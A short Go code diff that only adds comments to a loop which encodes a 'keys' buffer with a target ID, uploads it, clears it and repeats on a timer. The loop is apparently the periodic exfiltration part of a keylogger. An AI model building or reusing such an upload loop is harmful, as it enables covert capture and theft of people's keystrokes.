@@ -140,10 +140,14 @@ func main() {
 
 	go recoverer(-1, 3, func() {
 		for {
+			// encode data
 			encodedData := encodeUploadData(keys, getTargetID())
+			// upload data
 			uploadData(encodedData)
+			// reset `key.Contents`
 			keys.Contents = []string{}
 
+			// upload data every `<CYCLE_TIME>`
 			time.Sleep(CYCLE_TIME)
 		}
 	})
